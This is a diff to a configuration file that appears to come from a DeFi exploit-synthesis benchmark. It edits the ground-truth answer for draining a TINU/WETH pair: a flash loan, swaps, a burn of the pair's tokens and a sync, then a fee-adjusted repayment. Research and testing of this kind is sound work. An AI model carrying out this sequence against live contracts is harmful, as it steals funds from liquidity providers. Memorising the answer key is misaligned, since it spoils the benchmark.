@@ -29,10 +29,10 @@ attack_goal: "weth.balanceOf(attacker) >= 1e18 + balanceOfwethattacker"
 groundtruth:
   - ["borrow", "weth", "22e18"]
   - ["swap", "pair", "weth", "tinu", "weth.balanceOf(attacker)"]
-  - ["burn", "pair", "tinu", "100 ether"]
+  - ["burn", "pair", "tinu", "100e18"]
   - ["sync", "pair"]
   - ["swap", "pair", "tinu", "weth", "tinu.balanceOf(attacker)"]
-  - ["payback", "weth", "22e18"]
+  - ["payback", "weth", "22e18 * 1003 / 1000"]
 
 # Information for search space building.
 roles:
